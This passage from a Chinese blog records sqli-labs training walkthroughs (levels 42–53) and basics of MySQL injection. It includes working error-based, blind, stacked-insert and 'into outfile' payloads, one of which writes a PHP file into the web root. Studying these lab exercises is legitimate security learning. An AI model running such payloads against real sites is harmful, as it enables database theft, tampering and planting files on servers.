values(42,&#39;Less42&#39;,&#39;Less42&#39;)#</code></p><p><strong>注意：输入框中不要用–+是因为+不会进行url编码，因为他不在url地址栏中，可以使用 # %23 – #</strong></p><h3 id="Less43：POST-基于报错的堆叠注入字符型-带括号"><a href="#Less43：POST-基于报错的堆叠注入字符型-带括号" class="headerlink" title="Less43：POST-基于报错的堆叠注入字符型(带括号)"></a>Less43：POST-基于报错的堆叠注入字符型(带括号)</h3><p>搞注入的地方和上一关一样啊，，，</p><p>试了半天的错被怼了半天。。。最后发现要在密码框进行试错，，，</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222023102002.png" alt="image-20210222023102002"></p><p>闭合为<code>&#39;)</code></p><p>剩下的和前一贯一样了</p><h3 id="Less44：POST-基于报错-盲注-堆叠注入字符型"><a href="#Less44：POST-基于报错-盲注-堆叠注入字符型" class="headerlink" title="Less44：POST-基于报错-盲注-堆叠注入字符型"></a>Less44：POST-基于报错-盲注-堆叠注入字符型</h3><p>老地方，，，，不过换个方式，试试万能密码：<code>1&#39; or 1=1#</code>，成了！</p><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222024937343.png" alt="image-20210222024937343"></p><p>哈哈，不过在登录界面就可以堆叠注入了</p><p>payload：<code>1&#39;;insert into users values (&#39;44&#39;,&#39;less44&#39;,&#39;less44&#39;)#</code></p><h3 id="Less45：POST-基于报错字符型-盲注-堆叠注入"><a href="#Less45：POST-基于报错字符型-盲注-堆叠注入" class="headerlink" title="Less45：POST-基于报错字符型-盲注-堆叠注入"></a>Less45：POST-基于报错字符型-盲注-堆叠注入</h3><p>45 关与 43 关一样</p><pre><code class="hljs sql">1&#x27;);<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">45</span>,<span class="hljs-string">&#x27;Less45&#x27;</span>,<span class="hljs-string">&#x27;Less45&#x27;</span>)<span class="hljs-comment">#</span></code></pre><h3 id="Less46：GET-基于报错-数字型-排序注入"><a href="#Less46：GET-基于报错-数字型-排序注入" class="headerlink" title="Less46：GET-基于报错-数字型-排序注入"></a>Less46：GET-基于报错-数字型-排序注入</h3><p>这一关参考：<a href="https://blog.csdn.net/weixin_39934520/article/details/106167470%EF%BC%8C%E6%94%B6%E8%8E%B7%E6%BB%A1%E6%BB%A1%EF%BC%81">https://blog.csdn.net/weixin_39934520/article/details/106167470，收获满满！</a></p><p>可以发现输入sort的值不一样，排序结果就不一样，那么猜测后台肯定用到该参数进行排序！那么后台语句应该是：<code>select * from users order by $sort</code></p><p>这就好办了</p><h4 id="1-sort-select"><a href="#1-sort-select" class="headerlink" title="1.?sort=(select **)"></a>1.?sort=(select <strong>**</strong>)</h4><p>也算是结合报错注入</p><pre><code class="hljs sql">数据库?sort=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)表?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)字段?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)数据?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)在《注入天书》中还见到了派生表的另一种写法：?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)))updatexml的例子?<span class="hljs-keyword">sort</span>=UpdateXml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)延时注入?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>),<span class="hljs-number">0</span>) ?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>))布尔盲注因为<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span>接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是没有作用的，我们只能用第三句式的<span class="hljs-keyword">rand</span>()函数，通过观察<span class="hljs-keyword">ID</span>顺序的不同，即可判断<span class="hljs-literal">true</span>页面和<span class="hljs-literal">false</span>页面。<span class="hljs-literal">true</span>:?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>)fslse:?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>))=<span class="hljs-number">116</span>)利用 <span class="hljs-keyword">procedure</span> analyse 参数，我们可以执行报错注入。?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)导出文件 <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入：?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span></code></pre><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%952/image-20210222031730681.png" alt="image-20210222031730681"></p><h3 id="Less47：GET-基于报错-字符型-排序注入-单引号"><a href="#Less47：GET-基于报错-字符型-排序注入-单引号" class="headerlink" title="Less47：GET-基于报错-字符型-排序注入(单引号)"></a>Less47：GET-基于报错-字符型-排序注入(单引号)</h3><p>和46差不多，只是闭合不一样</p><pre><code class="hljs sql">基于报错注入?sort=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+</span><span class="hljs-string"></span><span class="hljs-string"> Time 盲注</span><span class="hljs-string"> ?sort=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.3</span>))<span class="hljs-comment">--+</span><span class="hljs-keyword">procedure</span> analyse 参数后注<span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; --+</span><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.php&quot;</span> <span class="hljs-keyword">lines</span> <span class="hljs-keyword">terminated</span> <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e2020</span><span class="hljs-comment">--+</span></code></pre><h3 id="Less48：GET-基于报错-盲注-数字型排序注入"><a href="#Less48：GET-基于报错-盲注-数字型排序注入" class="headerlink" title="Less48：GET-基于报错-盲注-数字型排序注入"></a>Less48：GET-基于报错-盲注-数字型排序注入</h3><p>本关与 less-46 的区别在于报错注入不能使用，不进行错误回显，因此其他的方法我们依旧是可以使用的。</p><pre><code class="hljs sql">Bool 盲注?sort=rand((ascii(mid((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">65</span>)<span class="hljs-built_in">Time</span> 盲注?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">if</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">mid</span>(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.1</span>))<span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> 参数注入?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;C:\\phpStudy\\WWW\\sqli\\Less-46\\test.txt&quot;</span></code></pre><h3 id="Less49：GET-基于报错-盲注-字符型排序注入"><a href="#Less49：GET-基于报错-盲注-字符型排序注入" class="headerlink" title="Less49：GET-基于报错-盲注-字符型排序注入"></a>Less49：GET-基于报错-盲注-字符型排序注入</h3><p> 本关与 47 关基本类似，区别在于没有错误回显，所以我们可以通过延时注入和导入文件进 行注入</p><pre><code class="hljs sql">Time 盲注?sort=1&#x27; and if(ascii(mid(database(),1,1))=115,1,sleep(1))<span class="hljs-comment">--+</span>into outfile 参数注入?sort=1&#x27; into outfile &quot;C:\\phpStudy\\WWW\\sqli\\Less-47\\test.txt&quot; <span class="hljs-comment">--+</span></code></pre><h3 id="Less50：GET-基于报错-数字型-排序堆叠注入"><a href="#Less50：GET-基于报错-数字型-排序堆叠注入" class="headerlink" title="Less50：GET-基于报错-数字型-排序堆叠注入"></a>Less50：GET-基于报错-数字型-排序堆叠注入</h3><p>执行 sql 语句我们这里使用的是 mysqli_multi_query()函数，而之前我们使用的是 mysqli _query()，区别在于 mysqli_multi_query()可以执行多个 sql 语句，而 mysqli_query()只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 sta tcked injection。</p><pre><code class="hljs sql">?sort=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">50</span>,<span class="hljs-string">&#x27;Less50&#x27;</span>,<span class="hljs-string">&#x27;Less50&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h3 id="Less51：GET-基于报错-字符型-排序堆叠注入"><a href="#Less51：GET-基于报错-字符型-排序堆叠注入" class="headerlink" title="Less51：GET-基于报错-字符型-排序堆叠注入"></a>Less51：GET-基于报错-字符型-排序堆叠注入</h3><p> 和Less-50的一样，但是注意单引号的闭合和注释符。</p><pre><code class="hljs sql">?sort=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;-&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a) b)<span class="hljs-comment">--+</span></code></pre><h3 id="Less52：GET-bool盲注-数字型-排序堆叠注入"><a href="#Less52：GET-bool盲注-数字型-排序堆叠注入" class="headerlink" title="Less52：GET-bool盲注-数字型-排序堆叠注入"></a>Less52：GET-bool盲注-数字型-排序堆叠注入</h3><p> 布尔盲注，延时注入都可以参考Less-46</p><pre><code class="hljs sql">堆叠注入?sort=1;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">52</span>,<span class="hljs-string">&#x27;Less52&#x27;</span>,<span class="hljs-string">&#x27;Less52&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h3 id="Less53：GET-盲注-字符型-排序堆叠注入"><a href="#Less53：GET-盲注-字符型-排序堆叠注入" class="headerlink" title="Less53：GET-盲注-字符型-排序堆叠注入"></a>Less53：GET-盲注-字符型-排序堆叠注入</h3><p>和上一关一样</p><pre><code class="hljs sql">堆叠注入?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">users</span>(<span class="hljs-keyword">id</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-number">53</span>,<span class="hljs-string">&#x27;Less53&#x27;</span>,<span class="hljs-string">&#x27;Less53&#x27;</span>)<span class="hljs-comment">--+</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql-labs记录1</title>
    <link href="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/"/>
    <url>/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/</url>
    
    <content type="html"><![CDATA[<p>本文记录一下sqli-labs第1-22关注入学习的过程。</p><a id="more"></a><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1.information_schema"></a>1.information_schema</h3><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216142604439.png" alt="image-20210216142604439"></p><p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。把mysql数据库看作一本书，则它相当于mysql数据库的目录。</p><p>我们经常在注入时结合information_schema来爆数据库、表、字段等等。介绍几个常用的</p><pre><code class="hljs mysql">information_schema.schemata所有数据库名，show databases()的结果就是取自于此；schema_name数据库名，schemata属性，跟show databases()显示出来的一样；information_schema.tables所有表的信息table_name表的名称，table属性table_schema数据库名，table属性information_schema.columns表示所有列的信息table_name表的名称，columns属性column_name列的名称，columns属性table_schema数据库名，columns属性</code></pre><p><strong>栗子</strong></p><p>1.查询所有数据库：</p><pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></pre><p>2.查询数据表：</p><pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;&quot;</code></pre><p>3.查询字段：</p><pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;&quot;</code></pre><p>4.查询数据：</p><pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(username,&quot; &quot;,password) from  table_name</code></pre><h3 id="2-基础函数"><a href="#2-基础函数" class="headerlink" title="2.基础函数"></a>2.基础函数</h3><h4 id="1-系统函数"><a href="#1-系统函数" class="headerlink" title="1.系统函数"></a>1.系统函数</h4><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>——MySQL 版本<span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>——数据库用户名<span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>——数据库名@@datadir——数据库路径@@version_compile_os——操作系统版本</code></pre><p>user()可能为以下情况</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>localhost:表本地  <span class="hljs-symbol">root@</span>%：表任意主机  <span class="hljs-symbol">root@</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>：表指定IP</code></pre><h4 id="2-union"><a href="#2-union" class="headerlink" title="2.union"></a>2.union</h4><p>用于将不同表中相同列中查询的数据展示出来，不包括重复数据。但是UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时每条 SELECT 语句中的 列的顺序必须相同。若要重复值也显示出来，则使用<code>UNION ALL</code></p><h4 id="3-字符串连接函数"><a href="#3-字符串连接函数" class="headerlink" title="3.字符串连接函数"></a>3.字符串连接函数</h4><h5 id="1-concat-str1-str2-…"><a href="#1-concat-str1-str2-…" class="headerlink" title="1.concat(str1,str2,…)"></a>1.<strong>concat(str1,str2,…)</strong></h5><p>没有分隔符地连接字符串.返回结果为连接参数产生的字符串。</p><pre><code class="hljs pgsql">如有任何一个参数为<span class="hljs-keyword">NULL</span> ，则返回值为 <span class="hljs-keyword">NULL</span>。如果所有参数均为非二进制字符串，则结果为非二进制字符串。 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。若要避免一个数字参数被转化为与之相等的二进制字符串格式,可使用显式类型 <span class="hljs-keyword">cast</span>, 例如： `<span class="hljs-keyword">SELECT</span> CONCAT(CAST(int_col <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>), char_col)`</code></pre><p>另外虽然没有分隔符连接字符串，但还是试验时可以使用分隔符：<code>concat(id,&#39;|&#39;,pwd,&#39;|&#39;,repwd)</code>：|为分割符,可为任意分隔符。</p><h5 id="2-concat-ws-‘separator’-str1-str2-…"><a href="#2-concat-ws-‘separator’-str1-str2-…" class="headerlink" title="2.concat_ws(‘separator’,str1,str2,…)"></a>2.<strong>concat_ws(‘separator’,str1,str2,…)</strong></h5><p>全称<code>CONCAT With Separator</code>,含有分隔符地连接字符串。</p><pre><code class="hljs yaml"><span class="hljs-string">分隔符可以是一个字符串，也可以是其它参数。如果分隔符为</span> <span class="hljs-literal">NULL</span><span class="hljs-string">，则结果为</span> <span class="hljs-literal">NULL</span><span class="hljs-string">。函数会忽略任何分隔符参数后的</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">值，不会忽略任何空字符串。</span></code></pre><h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat()"></a>3.<strong>group_concat()</strong></h5><p>返回要连接的字段的一个集合</p><p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p><p>当只有一个参数时，默认连接分隔符是”,“</p><h4 id="4-用于盲注的函数"><a href="#4-用于盲注的函数" class="headerlink" title="4.用于盲注的函数"></a>4.用于盲注的函数</h4><p><strong>floor()</strong></p><p>说明：向下取整。floor(1)=floor(1.2)=1</p><p><strong>rand()</strong></p><p>说明：在0和1之间产生一个随机数。rand(0)*2将取0到2的随机数，并不是执行两次随机数。rand不能和order by一起使用</p><p><strong>if()</strong></p><p>说明：<code>if(expr1,expr2,expr3)</code>含义是如果expr1是True,则返回expr2,否则返回expr3。多用于时间盲注。</p><p><strong>length()</strong></p><p>说明：返回字符串的长度</p><p><strong>count()</strong></p><p>说明：用来统计记录的数量。其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</p><p><strong>left(a,b)</strong></p><p>说明：database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p><p>举例：<code>left(database(),1)&gt;’s’ </code></p><p><strong>Ascii()</strong></p><p>说明：Ascii()将某个字符转换 为 ascii 值</p><p><strong>substr(a,b,c)</strong></p><p>说明：从 b 位置开始，截取字符串 a 的 c 长度。</p><p>举例：</p><pre><code class="hljs mysql">ascii(substr((select table_name information_schema.tables where tables_schema &#x3D;database()limit 0,1),1,1))&#x3D;101 --+</code></pre><p><strong>mid(a,b,c)</strong></p><p>说明：从位置 b 开始，截取 a 字符串的 c 位 </p><p><strong>ord()</strong></p><p>说明：Ord()函数同 ascii()，将字符转为 ascii 值</p><p>举例：</p><pre><code class="hljs mysql">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></pre><p><strong>sleep()</strong></p><p>说明：<code>sleep(n)</code>将程序挂起n秒后执行。多用于时间盲注。</p><p><strong>BENCHMARK()</strong></p><p>说明：BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 <strong>sleep()</strong></p><p>举例：</p><pre><code class="hljs sql">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">119</span>),<span class="hljs-keyword">BENCHMARK</span>(<span class="hljs-number">5000000</span>,<span class="hljs-keyword">ENCODE</span>(‘M SG’,’<span class="hljs-keyword">by</span> <span class="hljs-number">5</span> <span class="hljs-keyword">seconds</span>’)),<span class="hljs-literal">null</span>) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1;</code></pre><h3 id="3-常见注入"><a href="#3-常见注入" class="headerlink" title="3.常见注入"></a>3.常见注入</h3><h4 id="1-十种报错注入"><a href="#1-十种报错注入" class="headerlink" title="1.十种报错注入"></a>1.十种报错注入</h4><p>sql语句错误时，web页面会报错，有的会输出后台数据库错误语句。</p><h5 id="1-双查询注入报错-floor-报错"><a href="#1-双查询注入报错-floor-报错" class="headerlink" title="1.双查询注入报错-floor()报错"></a>1.双查询注入报错-floor()报错</h5><p>固定套路：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,([子查询],<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">form</span> [table_name] <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;理论上每次都有百分之50的可能性成功报错可以替换为以下（不过没试验过。。）<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(), <span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))如果关键的表被禁用了，可以使用这种形式 <span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-literal">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> !<span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))如果 <span class="hljs-keyword">rand</span> 被禁用了可以使用用户变量来报错<span class="hljs-keyword">select</span> <span class="hljs-keyword">min</span>(@a:=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">password</span>,@a:=(@a+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>)</code></pre><p><strong>原理</strong>：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为1,<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。正确结果与报错信息一起输出。</p><p>关于key：<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。</p><p>原理来自：<a href="https://www.cnblogs.com/BloodZero/p/4660971.html">https://www.cnblogs.com/BloodZero/p/4660971.html</a></p><h5 id="2-updatexml和extractvalue"><a href="#2-updatexml和extractvalue" class="headerlink" title="2.updatexml和extractvalue"></a>2.updatexml和extractvalue</h5><p><strong>updatexml</strong></p><p>UPDATEXML (XML_document, XPath_string, new_value); </p><pre><code class="hljs crmsh">第一个参数：XML_document是<span class="hljs-keyword">String</span>格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (<span class="hljs-keyword">Xpath</span>格式的字符串) ，如果不了解<span class="hljs-keyword">Xpath</span>语法，可以在网上查找教程。 第三个参数：new_value，<span class="hljs-keyword">String</span>格式，替换查找到的符合条件的数据</code></pre><p>用法，最大长度限制32位</p><pre><code class="hljs sql">and updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span 